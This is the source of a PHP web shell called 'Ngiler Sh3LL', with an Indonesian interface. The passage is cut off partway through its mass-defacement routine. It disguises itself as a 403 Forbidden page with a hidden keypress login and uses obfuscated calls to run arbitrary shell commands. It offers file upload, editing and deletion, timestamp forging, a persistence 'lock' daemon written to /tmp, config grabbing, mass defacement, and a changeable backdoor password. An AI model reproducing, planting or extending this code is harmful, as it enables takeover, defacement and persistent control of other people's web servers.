<?php
session_start();
error_reporting(0);
$pew = "0492d31bb559516565e4268b5a5b8e9c9806f20b"; 
if (isset($_POST['pewe'])) {
    $s1 = "\163\x68\141\x31";
    $san = $s1($_POST['pewe']);
    
    if ($san === $pew) {
        $_SESSION['logged_in'] = true;
        echo '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">';
        echo "<style>body {text-align: center;margin: 200px;background-color:rgb(94, 94, 94);}</style>";
        echo "<div class='card p-4 text-white bg-dark'><div class='mb-1'>
        <img style='width:190px;height:180px;' src='https://media.invisioncic.com/p313717/monthly_2021_11/anime-girl.thumb.gif.813e7ea383dbbfff12fc1f029644a9cc.gif'><br><font color='lime'><h3>Login berhasil..!!</h3></font></div></div>";
        echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "'; }, 2000);</script>";
        exit;
    } else {
        $error = "Password salah jancok!!";
    }
}
if (isset($_GET['keluar'])) {
    session_destroy();
    echo '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">';
    echo "<style>body {text-align: center;margin: 200px;background-color:rgb(94, 94, 94);}</style>";
    echo "<div class='card p-4 text-white bg-dark'><div class='mb-1'>
    <img style='width:190px;height:180px;' src='https://media.invisioncic.com/p313717/monthly_2021_11/anime-girl.thumb.gif.813e7ea383dbbfff12fc1f029644a9cc.gif'><br><font color='lime'><h3>Logout berhasil..!!</h3></font></div></div>";
    echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "'; }, 2000);</script>";
    exit;
    }
if (!isset($_SESSION['logged_in'])):
    http_response_code(403);
    echo "<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body>
    <h1>403 Forbidden</h1>
    <p>Anda tidak memiliki izin untuk mengakses halaman ini.</p>
</body>
</html>";
    if (isset($_GET['xor'])) {
echo '
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <style>
        .modal {
            display: none;
            position: fixed;
            z-index: 999;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            text-align: center;
        }
        .close-btn {
            float: right;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<script>
document.addEventListener("keydown", function(event) {
    if (event.key === "p" || event.key === "P") {
        document.getElementById("loginModal").style.display = "flex";
    }
});
function closeModal() {
    document.getElementById("loginModal").style.display = "none";
}
</script>
<body>
<div id="loginModal" class="modal">
    <div class="modal-content">
        <span class="close-btn" onclick="closeModal()">×</span>
        <h2>Login</h2>
    <form method="post">
        <input type="password" name="pewe" placeholder="Masukkan password" required>';
        if (isset($error)) echo '<p style="color:red;">'.$error.'</p>
        <input type="hidden" name="pewe" value="1">
    </form>
        </div>
</div>
</body>
</html>';
    }
exit;
endif;
$d7net = [
    '696e666f', # i nfo - 0
    '61706c7574', # u plut - 1
    '656b7365', # co man - 2
    '6c6f6b70696c65', # lok pile - 3 
    '67616e74697077', # bek konek - 4
    '636e666967', # c nfig - 5
    '6366696c65', # c pi le - 6
    '63646972', # c dir - 7
    '746f6f6c73', # T oo ls - 8
    '6d6173736465706573', # msd epes - 9
    '7a6970657874' # zi pext - 10
];
function renameItem($oldName, $newName) {
    if (rename($oldName, $newName)) {
        echo "File/Folder berhasil diubah!";
    } else {
        echo "Terjadi kesalahan saat mengubah nama!";
    }
}
function deleteItem($item) {
    if (is_file($item)) {
        if (unlink($item)) {
            successMessage("File berhasil dihapus!", dirname($item));
        } else {
            echo "Terjadi kesalahan saat menghapus file!";
        }
    } elseif (is_dir($item)) {
        if (cekfol($item)) {
            successMessage("Folder berhasil dihapus!", dirname($item));
        } else {
            echo "Terjadi kesalahan saat menghapus folder!";
        }
    }
}

function cekfol($folder) {
    foreach (scandir($folder) as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullPath = $folder . '/' . $file;
        if (is_dir($fullPath)) {
            cekfol($fullPath);
        } else {
            unlink($fullPath);
        }
    }
    return rmdir($folder);
}

function successMessage($message, $redirectDir) {
    echo '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">';
    echo "<style>body {text-align: center;margin: 250px;background-color:rgb(94, 94, 94);}</style>";
    echo "<div class='card p-4 text-white bg-dark'><div class='mb-1'>
    <img style='width:40px;height:32px;' src='https://media.tenor.com/0EflySmYSuAAAAAi/check-mark-button-joypixels.gif'>
    <font color='lime'><h3>$message</h3></font></div></div>";
    echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "?opet=" . allheks($redirectDir) . "'; }, 2000);</script>";
    exit;
}
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = $_POST['path'];

    if ($action == 'rename') {
        $newName = $_POST['new_name'];
        renameItem($path, $newName);
    } elseif ($action == 'delete') {
        deleteItem($path);
    }
    if ($action == 'save_date') {
        $edate = $_POST['path'];
        if(isset($_POST['sikat'])) {
            if(@touch($edate, strtotime($_POST['chdate'])) == true) {
                echo successMessage("Berhsil mengubah Tanggal!", dirname($edate));
                exit;
            } else {
                echo "<div class='alert alert-danger'>Gagal mengubah tanggal!</div>";
            }
        }
    }
    if ($action == 'save_edit') {
        $editPath = $_POST['path'];
        $newContent = $_POST['content']; 
        if (is_file($editPath)) {
            file_put_contents($editPath, $newContent);
            echo successMessage("File Berhasil Disimpan!", dirname($editPath));
            exit;
        } else {
            echo "<div class='alert alert-danger'>Gagal menyimpan file!</div>";
        }
    }
    if ($action == 'rename_item') {
        $old = $_POST['old_path'];
        $new = dirname($old) . '/' . $_POST['new_name'];
    
        if (rename($old, $new)) {
            echo '<script>
                var showModal = function() {
                    var modal = new bootstrap.Modal(document.getElementById("successModal"));
                    modal.show();
                    setTimeout(() => {
                        window.location.href = "' . basename($_SERVER["SCRIPT_FILENAME"]) . '?opet=' . allheks(dirname($new)) . '";
                    }, 2000);
                };
                window.onload = showModal;
            </script>';
        } else {
            echo '<script>
                var showModal = function() {
                    var modal = new bootstrap.Modal(document.getElementById("failModal"));
                    modal.show();
                };
                window.onload = showModal;
            </script>';
        }
    }          
}
function pkesek(): bool {
    $paths = explode(PATH_SEPARATOR, getenv('PATH'));
    foreach ($paths as $path) {
        $fullPath = $path . DIRECTORY_SEPARATOR . 'pkexec';
        if (file_exists($fullPath) && is_executable($fullPath)) {
            return true;
        }
    }
    return false;
}
function gcc() {
   $paths = [
        '/usr/bin/gcc', 
        '/bin/gcc', 
        '/usr/local/bin/gcc'
    ];
    foreach ($paths as $path) {
        if (is_executable($path)) {
            return $path;
        }
    }

    return false;
}

function allheks($str) {
    $hex = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $hex .= dechex(ord($str[$i]));
    }
    return $hex;
}

function cdheks($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}
function d7net_ex($file) {
    $pile = $file;
    $pch = pathinfo($pile, PATHINFO_FILENAME);
    return $pch;
}
function ekse($crot, $currentDir = false) {
    if (empty(trim($crot))) {
        echo "<textarea class='form-control mb-3' rows='10' style='background-color:rgb(28, 28, 28);color: lime;' readonly>
$ help for information
or
Usage : ls -al, uname, whoami, dir</textarea>";
        return;
}
    $run = "2>&1";
    if (!preg_match("/".$run."/i", $crot)) {
        $crot = $crot." ".$run;
    }
    $crt = $crot;
    $pr = "p"."ro"."c_o"."p"."en";
    if (function_exists($pr)) {
        $cek = @$pr($crt, array(
            0 => array("pipe", "w"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        ), $ktn, $currentDir);
        if (is_resource($cek)) {
            fclose($ktn[0]);
            echo "<pre><textarea class='form-control' rows='10' style='background-color:rgb(28, 28, 28);color: lime;' readonly>". htmlspecialchars(stream_get_contents($ktn[1]))."</textarea></pre>";
            fclose($ktn[1]);
            fclose($ktn[2]);
            proc_close($cek);
        }
    } else {
        echo "<div class='alert alert-danger'>Disable => <code>".$pr."()</code></div>";
    }
}   
function cemde($gas, $currentDir) {
    $crot = $gas;
    $pr = "proc_open";
    if (function_exists($pr)) {
    $tod = @proc_open($crot, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $currentDir);
    echo "".stream_get_contents($crottz[1])."</textarea></center><br>";
    } else {
        echo "<font color='orange'></font>";
    }
}
$currentDir = isset($_GET['opet']) ? cdheks($_GET['opet']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);
$folders = [];
$files = [];

$items = scandir($currentDir);
foreach ($items as $item) {
    if ($item != '.' && $item != '..') {
        $fullPath = $currentDir . '/' . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
}

$allItems = array_merge($folders, $files);
$paths = explode("/", $currentDir);

function fsize($size) {
    if ($size >= 1073741824) {
        $size = '<font color="aqua">'.number_format($size / 1073741824, 2) . '</font> GB';
    } elseif ($size >= 1048576) {
        $size = '<font color="aqua">'.number_format($size / 1048576, 2) . '</font> MB';
    } elseif ($size >= 1024) {
        $size = '<font color="orange">'.number_format($size / 1024, 2) . '</font> KB';
    } elseif($size>1){
        $size= '<font color="orange">'.$size.'</font> B';
    } elseif($size==1){
        $size= '<font color="orange">'.$size.'</font> B';
    } else {
        $size = '<font color="red">0</font> B';
    }
    return $size;
}

function owner($file) {
    if (function_exists("posix_getpwuid")) {
        $tod = @posix_getpwuid(fileowner($file));
        return "<center>".$tod['name']."</center>";
    } else {
        return "<center>".fileowner($file)."</center>";
    }
}
if (isset($_GET['chdet'])) {
    $chedit = $_GET['chdet'];
    $chtime = basename($chedit);
    $tgl = date('d F Y g:i:s', filemtime($chedit));
    echo '<!DOCTYPE html>
    <html><heaD><title>Ganti Tanggal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body {background-color:rgb(102, 99, 99);margin:250px;}</style></head>
    <div class="card p-4 bg-dark text-white">
    <h3>Editing time : '.$chtime.'</h3>
    <form method="POST">
    <input type="hidden" name="action" value="save_date">
    <input type="hidden" name="path" value="'.htmlspecialchars($chedit).'">
    <input type="text" name="chdate" class="form-control mb-3" value="'.$tgl.'" required>
    <input type="submit" name="sikat" class="btn btn-success w-100">
    </html></form></div>'; exit;
}
if (isset($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    if (is_file($fileToEdit)) {
        $fileContent = htmlspecialchars(file_get_contents($fileToEdit));
        $fileName = basename($fileToEdit);
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Edit File - <?php echo $fileName; ?></title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.0/codemirror.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.0/theme/material.min.css">
            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.0/codemirror.min.js"></script>
            <style>
                body {
                    background-color:rgb(102, 99, 99);
                    margin: 80px;
                }
            </style>
        </head>
        <body class="p-4">
        <div class="card p-4 text-white bg-dark">
            <div class="mb-3">
            <h2>Editing: <?php echo $fileName; ?></h2>
            <a href="?opet=<?php echo allheks(dirname($fileToEdit)); ?>" class="btn btn-secondary">Cancel</a>
            <form method="post">
                <input type="hidden" name="action" value="save_edit">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($fileToEdit); ?>">
                <textarea id="php_code" name="content"><?php echo $fileContent; ?></textarea><br>
                <button type="submit" class="btn btn-success w-100">Save</button>
            </form>
            

            <script>
                var editor = CodeMirror.fromTextArea(document.getElementById("php_code"), {
            lineNumbers: true,
            mode: "application/x-httpd-php",
            theme: "material", 
            lineWrapping: true,
            viewportMargin: Infinity
            });
                
            </script>
            </div>
        </div>
    </body>
</html>
        <?php
        exit;
    } else {
        echo "File tidak ditemukan.";
        exit;
    }
}
if (isset($_GET['rename'])) {
    $fileToRename = $_GET['rename'];
    $currentName = basename($fileToRename);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Rename Item - <?php echo $currentName; ?></title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="p-4">
        <h2>Rename: <?php echo $currentName; ?></h2>
        <form method="post">
            <input type="hidden" name="action" value="rename_item">
            <input type="hidden" name="old_path" value="<?php echo htmlspecialchars($fileToRename); ?>">
            <div class="mb-3">
                <label for="new_name" class="form-label">New Name</label>
                <input type="text" name="new_name" id="new_name" class="form-control" value="<?php echo $currentName; ?>" required>
            </div>
            <button type="submit" class="btn btn-success">Rename</button>
            <a href="<?php echo basename($_SERVER['SCRIPT_FILENAME']); ?>?opet=<?php echo allheks(dirname($fileToRename)); ?>" class="btn btn-secondary">Cancel</a>
        </form>
    </body>
    </html>
    <?php
    exit;
}
function winDriver() {
    $windowsDrives = [
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($windowsDrives as $drive) {
        $hexDrive = allheks($drive . ':');
        if (is_dir($drive . ":/")) {
        echo "<a href='?opet={$hexDrive}' class='me-2 link-offset-2 link-underline link-underline-opacity-0'>[$drive:]</a>";
        }
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>#$$#!$#%$&</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.0/theme/material.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.0/codemirror.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"rel="stylesheet"crossorigin="anonymous"integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="referrerpolicy="no-referrer">
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Fira Code', monospace;background-color:rgb(96, 94, 94);color: #fff;margin: 40px;}
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 5px; text-align: left; border: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
        .actions button { margin: 2px; }
        .button-container {
      position: fixed;
      top: 90%;
      right: 20px;
      transform: translateY(-50%);
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      z-index: 999;
    }

    .hover-text {
        margin-bottom: 8px;
      background-color: #222;
      color: #fff;
      padding: 8px 14px;
      border-radius: 8px;
      opacity: 0;
      transform: scale(0.5) translateY(20px);
      transition: transform 0.4s ease, opacity 0.4s ease;
      font-size: 14px;
      pointer-events: auto;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
    }
    .button-container:hover .hover-text {
      opacity: 1;
      transform: scale(1) translateY(0);
    }
    .hover-text:hover {
      background-color: #333;
      color: #00ffff;
      transform: scale(1.05);
      text-shadow: 0 0 8px #00ffff;
      transition: all 0.3s ease;
      cursor: pointer;
    }

    .button-container:hover .hover-text {
      opacity: 1;
      transform: scale(1) translateY(0);
    }

    .fixed-button {
      padding: 7px 18px;
      background-color:rgb(41, 41, 41);
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-size: 15px;
      font-weight: bold;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      box-shadow: 0 5px 18px rgba(0, 3, 167, 0.2);
    }

    .fixed-button:hover {
      transform: scale(1.05);
      box-shadow: 0 6px 14px rgba(0,0,0,0.3);
    }
    body.loading {
        overflow: hidden;
    }

    .breadcrumb a {
        text-decoration: none;
        color: blue;
     }
    .breadcrumb span {
            margin: 0 5px;
    }
    .file-icon, .folder-icon {
        margin-right: 8px;
    }
    a {
        color:rgb(255, 166, 64);
        pointer-events: auto;
        text-decoration: none;
    }
    a:hover{
      background-color: #333;
      color: #00ffff;
      transform: scale(1.05);
      text-shadow: 0 0 8px #00ffff;
      transition: all 0.3s ease;
      cursor: pointer;
        }
    .text-kedip {
      font-weight: bold;
      animation: blink 1s infinite;
    }

    @keyframes blink {
      0%, 100% {
        opacity: 1;
      }
      50% {
        opacity: 0;
      }
    }
    body, a, button:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
    default;
    }    
    a:hover {
    cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
    wait;
}
    </style>
</head>
<body>
<div class="card p-4 text-white bg-dark">
<div class="mb-3">
    <center>
    <h1>Ngiler Sh3LL</h1>
    <hr style="height:2px;border-width:0;background-color:#0be1ea">
    <a href='<?php echo basename($_SERVER['SCRIPT_FILENAME']); ?>' class='btn btn-outline-light'>Home</a>
    <a href="?opet=<?php echo allheks($currentDir) . "&d7net=". $d7net[0]; ?>" class="btn btn-outline-light"> Information</a>
    <a href="?opet=<?php echo allheks($currentDir) . "&d7net=". $d7net[1]; ?>" class="btn btn-outline-light"> Upload</a>
    <a href="?opet=<?php echo allheks($currentDir) . "&d7net=". $d7net[2]; ?>" class="btn btn-outline-light"> Command</a>
    <a href="?opet=<?php echo allheks($currentDir) . "&d7net=". $d7net[8]; ?>" class="btn btn-outline-light"> Tools</a>
    <a href="?keluar" class="btn btn-outline-light"> Logout</a>
    </center>
    <hr style="height:2px;border-width:0;background-color:#0be1ea">
    <div class="button-container">
    <a href="?opet=<?php echo allheks($currentDir) . "&d7net=". $d7net[6]; ?>" class="hover-text"><i class='fa-solid fa-file-circle-plus'></i> File</a>
    <a href="?opet=<?php echo allheks($currentDir) . "&d7net=". $d7net[7]; ?>" class="hover-text" style="color:#f39c12;"><i class='fa-solid fa-folder-plus'></i> Folder</a>
    <a class="fixed-button"><i class="fa-solid fa-square-plus"></i><span class="text-kedip"> Create</span></a>
  </div>
    <?php
    if (stristr(PHP_OS, "WIN")) {
        winDriver();
    }
    echo "<br>";
    echo '<i class="fas fa-folder text-warning me-1"></i>';
    $encodedPath = "";
    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            echo "<a href=\"?opet=" . allheks('/') . "\">/</a>";
            continue;
        }
        if($pat == '') continue;
        $encodedPath .= ($id > 0 ? "/" : "") . $pat;
        $hexPath = allheks($encodedPath);
        echo "<a href='?opet=" . $hexPath . "' class='link-offset-2 link-underline link-underline-opacity-0'>" . htmlspecialchars($pat) . "</a>/";
    }

?><br>
</div>
</div><br>
<?php
if ($_GET['d7net'] == allheks('ekse')) {
    echo '<div class="card p-4 text-white bg-dark">
    <h3>Command</h3><div class="mb-3">
    <form method="POST">
    <div class="input-group input-group-sm">
    <input type="text" name="crot" class="form-control" placeholder="uname -a" value="'.$_POST["crot"].'">
    <input type="submit" name="exe" value="=>" class="btn btn-outline-light">
    </div></form></div>';
    if(isset($_POST['exe'])) {
         ekse($_POST['crot'], $currentDir);
    } exit;

} elseif ($_GET['d7net'] == allheks('aplut')) {
    echo '<div class="card p-4 text-white bg-dark sm">
    <h3>Upload File</h3>
    <form action="" method="post" enctype="multipart/form-data" class="mt-3">
  <div class="input-group input-group-sm">
    <input type="file" class="form-control form-control-sm" name="fileUpload" required>
    <button type="submit" class="btn btn-success btn-sm" name="upload">Upload</button>
</form></div></div><br>';
if (isset($_FILES['fileUpload'])) {
    $targetDir = $currentDir . '/';
    $targetFile = $targetDir . basename($_FILES['fileUpload']['name']);
    $uploadOk = 1;
    if (file_exists($targetFile)) {
        echo "<div class='alert alert-danger'>File sudah ada!</div>";
        $uploadOk = 0;
    }
    if ($_FILES['fileUpload']['size'] > 5000000) {
        echo "<div class='alert alert-danger'>File terlalu besar!</div>";
        $uploadOk = 0;
    }
    if ($uploadOk == 1) {
        if (move_uploaded_file($_FILES['fileUpload']['tmp_name'], $targetFile)) {
            echo "<div class='alert alert-success'>File berhasil di-upload!</div>";
            echo "<script>setTimeout(() => { window.location.href = '" . basename($_SERVER['SCRIPT_FILENAME']) . "?opet=" . allheks(dirname($targetFile)) . "'; }, 2000);</script>";
        } else {
            echo "<div class='alert alert-danger'>Terjadi kesalahan saat meng-upload file!</div>";
            }
        }
}    
 exit;
 } elseif ($_GET['d7net'] == allheks('tools')) {
    echo '<div class="card p-4 text-white bg-dark sm">
    <hr style="height:2px;border-width:0;background-color:#0be1ea">
    <center>
    <div class="mb-1">
    <button onclick=location.href="?opet='. allheks($currentDir) . "&d7net=". $d7net[3] . '" class="btn btn-outline-light"> Lock File</button>
    <button onclick=location.href="?opet='. allheks($currentDir) . "&d7net=". $d7net[4] . '" class="btn btn-outline-light"> Ganti Password</button>
    <button onclick=location.href="?opet='. allheks($currentDir) . "&d7net=". $d7net[5] . '" class="btn btn-outline-light"> Grab Config</button>
    <button onclick=location.href="?opet='. allheks($currentDir) . "&d7net=". $d7net[9] . '" class="btn btn-outline-light"> Mass Deface</button>
    <button onclick=location.href="?opet='. allheks($currentDir) . "&d7net=". $d7net[10] . '" class="btn btn-outline-light"> Zip Extract</button>
    </center><hr style="height:2px;border-width:0;background-color:#0be1ea"></div></div>';
    exit;
} elseif ($_GET['d7net'] == allheks('lokpile')) {
    echo '<div class="card p-4 text-white bg-dark sm"><h3>Lock File</h3>
    <form method="POST">
    <input type="text" name="pile" class="form-control mb-3" placeholder="file.php">
    <button type="submit" class="btn btn-success btn-sm" name="submit"><i class="fa fa-lock" aria-hidden="true"></i> Lock</button>
    </form></div>';
    if (isset($_POST['submit'])) {
        if (empty($_POST['pile'])) {
            echo "<br><div class='card p-4 text-white bg-dark sm'><td><font color='orange'><center>The File field is required</center></font></td></div>";
        } else {
        $filez = $_POST['pile'];
        $tempe = "/tmp";
        if (file_exists($tempe.'/sess_'.md5($currentDir. $filez.'-xd7net').d7net_ex($filez).'h4nd') && file_exists($tempe . '/'.d7net_ex($filez).'-xopet')) {
            cemde('rm -rf '.$tempe.'/sess_'.md5($currentDir. $filez.'-xopet').d7net_ex($filez).'0p3t', $currentDir);
            cemde('rm -rf '.$tempe.'/sess_'.md5($currentDir. $filez.'-xd7net').d7net_ex($filez).'h4nd', $currentDir);
            }
            cemde("cp $filez ".$tempe."/sess_".md5($currentDir. $filez.'-xopet').d7net_ex($filez).'0p3t', $currentDir);
            @chmod($filez, 0444);
            $content = '<?php
    $tmp = "/tmp";
    $fileperm = d7net_perm("'.$filez.'");
    d7net_cmd("chmod 444 '.$filez.'");
    while (True) {
        if (!file_exists("'.$filez.'")) {
            $var = base64_encode(file_get_contents($tmp . "/sess_'.md5($currentDir. $filez.'-xopet').d7net_ex($filez).'0p3t"));
            FiLe_pUt_ConTentS("'.$filez.'", base64_decode($var));
        }
        if ($fileperm != "0444"){
            d7net_cmd("chmod 444 '.$filez.'");
        }
    }
    function d7net_cmd($value)
    {
        if (function_exists("system")) {
            sYsTem($value);
        } else if (function_exists("shell_exec")) {
            return ShEll_eXeC($value);
        } else if (function_exists("exec")) {
            return ExEc($value);
        } else if (function_exists("passthru")) {
            return pAsSThRu($value);
        }
    }
    function d7net_perm($filez){
        return substr(sprintf("%o", fileperms($filez)), -4);
    }';
    $content = file_put_contents($tempe. "/sess_" .md5($currentDir. $filez.'-xd7net'). d7net_ex($filez).'h4nd', $content);
    if ($content) {
        echo "<div class='card p-4 text-white bg-dark sm'><td>Locked => <font color='lime'>$filez</font></td></div>";
        cemde('php '. $tempe . '/sess_' .md5($currentDir. $filez.'-xd7net').d7net_ex($filez).'"h4nd" > /dev/null 2>/dev/null &', $currentDir);
    } else {
        echo "<div class='card p-4 text-white bg-dark sm'><td><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't lock $filez</font></td></div>";
            }
        }
    }
    exit;
    
} elseif ($_GET['d7net'] == allheks('zipext')) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    usleep(1500000);

    $extractTo = rtrim($_POST['extract_path'], '/');
    $zipPath = '';

    if (!empty($_FILES['zip_file']['tmp_name'])) {
        $zipPath = $_FILES['zip_file']['tmp_name'];
    } elseif (!empty($_POST['zip_path'])) {
        $zipPath = $_POST['zip_path'];
        if (!file_exists($zipPath)) {
            die("<div class='card p-4 text-white bg-dark sm'><script>doneLoading()</script>❌ File ZIP tidak ditemukan.</div><br>");
        }
    } else {
        die("<div class='card p-4 text-white bg-dark sm'><script>doneLoading()</script>❌ Harap upload atau isi path ZIP.</div><br>");
    }

    if (!is_dir($extractTo)) {
        if (!mkdir($extractTo, 0755, true)) {
            die("<div class='card p-4 text-white bg-dark sm'><script>doneLoading()</script>❌ Gagal membuat folder tujuan.</div><br>");
        }
    }

    $zip = new ZipArchive;
    if ($zip->open($zipPath) === TRUE) {
        $zip->extractTo($extractTo);
        $zip->close();
        echo "<div class='card p-4 text-white bg-dark sm'><div class='mb-3'><script>doneLoading()</script>✅ ZIP berhasil diekstrak => <i class='fas fa-folder text-warning me-1'></i><font color='orange'>".basename($extractTo)."</font></zip></div></div><br>";
    } else {
        echo "<div class='card p-4 text-white bg-dark sm'><script>doneLoading()</script>❌ Gagal membuka file ZIP.</zip></div><br>";
    }
}
    echo '
    <div id="loadingBox"><div class="card p-4 text-white bg-dark sm"><div class="mb-3"> Sedang Proses => <font color="aqua"><span id="percent">1%</span></font></div></div></div>
    <script>
        function startLoading() {
            document.getElementById("loadingBox").style.display = "block";
            let percent = 1;
            let interval = setInterval(function() {
                if (percent >= 100) {
                    clearInterval(interval);
                }
                document.getElementById("percent").innerText = percent + "%";
                percent++;
            }, 30); // 30ms * 100 = 3 detik
        }

        function doneLoading() {
            document.getElementById("percent").innerText = "✅ Selesai";
        }
    </script>
    <style>
        #loadingBox {
            display: none;
            font-weight: bold;
            font-family: monospace;
            padding: 10px;
            color: green;
        }
    </style>
    <div class="card p-4 text-white bg-dark sm">
    <center><h3>Zip Extractor</h3></center>
    <form id="zipForm" method="post" enctype="multipart/form-data" onsubmit="startLoading()">
        <label>Upload File ZIP (opsional):</label><br>
        <input type="file" class="form-control" name="zip_file"><br>

        <label>File ZIP (manual):</label><br>
        <input type="text" class="form-control" name="zip_path" placeholder="data.zip [cari lokasi file zip kamu.]"><br>

        <label>Path :</label><br>
        <input type="text" class="form-control" name="extract_path" value="'.$currentDir.'/" required><br>

        <button type="submit" class="btn btn-success">Ekstrak ZIP</button>
    </form>
    </div>
';
exit;

} elseif ($_GET['d7net'] == allheks('gantipw')) {
    function chpwd($ceks) {
    $newpw = sha1($ceks);
    $newpw = "\$pew = \"$newpw\";";
    $kon = file_get_contents($_SERVER['SCRIPT_FILENAME']);
    $kon = preg_replace("/\\\$pew *= *[\"']*([a-f0-9]{40})[\"']*;/s", $newpw, $kon);
    return file_put_contents($_SERVER['SCRIPT_FILENAME'], $kon);
}

echo '<div class="card p-4 text-white bg-dark sm">
<center><h3>Ganti Password Bekdur</h3>
<form method="POST">
<div class="input-group">
<input type="text" class="form-control mb-2" name="oldpass" placeholder="Password lama"></div>
<div class="input-group">
<input type="text" class="form-control mb-2" name="pass1" placeholder="Password baru"></div>
<div class="input-group">
<input type="text" class="form-control mb-2" name="pass2" placeholder="Ulangi Password baru"></div></center>
<button type="submit" name="cpw" class="btn btn-success btn-sm">Change</button>
</form></div>';

if (isset($_POST['cpw'])) {
    $oldpass = sha1($_POST['oldpass']);
    if ($oldpass === $pew) {
        if ($_POST['pass1'] === $_POST['pass2']) {
            if (chpwd($_POST['pass1'])) {
                echo '<br><div class="card p-4 text-white bg-dark sm">
                <font color="lime">Ganti Password Berhasil..!!</font></div>';
            } else {
                echo '<br><div class="card p-4 text-white bg-dark sm">
                <font color="red">Ganti Password Gagal..!!</font></div>';
            }
        } else {
            echo '<br><div class="card p-4 text-white bg-dark sm">
            <font color="orange">Password Baru tidak cocok..!!</font></div>';
        }
    } else {
        echo '<br><div class="card p-4 text-white bg-dark sm">
        <font color="orange">Password lama salah..!!</font></div>';
    }
}exit;

} elseif ($_GET['d7net'] == allheks('massdepes')) {
    function cekspol($dir) {
    $folders = [];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $folders[] = $path;
            $folders = array_merge($folders, cekspol($path));
        }
    }
    return $folders;
}

function massDepes($pat, $pilez, $konten) {
    $allFolders = cekspol($pat);
    array_unshift($allFolders, $pat);

    $output = "";

    foreach ($allFolders as $folder) {
        $fname = basename($folder);

        if (!is_dir($folder) || !is_writable($folder)) {
